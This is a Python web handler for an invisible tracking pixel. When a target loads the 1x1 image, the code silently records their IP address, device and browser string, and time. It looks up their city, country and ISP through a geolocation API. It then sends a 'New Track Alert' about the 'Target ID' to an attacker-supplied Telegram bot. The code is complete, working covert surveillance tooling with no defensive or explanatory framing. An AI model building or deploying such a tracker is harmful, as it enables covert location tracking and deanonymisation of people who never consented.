from http.server import BaseHTTPRequestHandler
import urllib.request
import urllib.parse
import base64
import json
from datetime import datetime

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        # 1. IP Capture
        if self.headers.get('X-Forwarded-For'):
            ip = self.headers.get('X-Forwarded-For').split(',')[0].strip()
        else:
            ip = self.client_address[0]
            
        # 2. Device Info (User-Agent) & Time Capture
        user_agent = self.headers.get('User-Agent', 'Unknown Device')
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S (Server Time)")
        
        # 3. Location Tracking via Free API (ip-api)
        location = "Unknown Location"
        try:
            # IP ki details nikalne ke liye request
            req = urllib.request.Request(f"http://ip-api.com/json/{ip}")
            with urllib.request.urlopen(req, timeout=3) as response:
                data = json.loads(response.read().decode())
                if data.get("status") == "success":
                    city = data.get("city", "")
                    country = data.get("country", "")
                    isp = data.get("isp", "")
                    location = f"{city}, {country} (ISP: {isp})"
        except Exception as e:
            print(f"Location API Error: {e}")
            pass
        
        # 4. URL Parameters se data uthana
        params = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
        token = params.get('token', [None])[0]
        chat_id = params.get('id', [None])[0]
        uid = params.get('uid', ['Unknown'])[0]
        
        # 5. Telegram par bhejna (Updated Message Format)
        if token and chat_id:
            msg = (
                f"📩 **New Track Alert!**\n"
                f"👤 Target ID: {uid}\n"
                f"🌐 IP: {ip}\n"
                f"📍 Location: {location}\n"
                f"🕒 Time: {current_time}\n"
                f"📱 Device/Browser: {user_agent}"
            )
            msg_encoded = urllib.parse.quote(msg)
            url = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={msg_encoded}&parse_mode=Markdown"
            
            try:
                urllib.request.urlopen(urllib.request.Request(url), timeout=5)
            except:
                pass
        
        # 6. Transparent Pixel return (1x1 Image)
        pixel_b64 = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII="
        pixel_data = base64.b64decode(pixel_b64)
        
        self.send_response(200)
        self.send_header('Content-type', 'image/png')
        self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
        self.end_headers()
        self.wfile.write(pixel_data)
        return
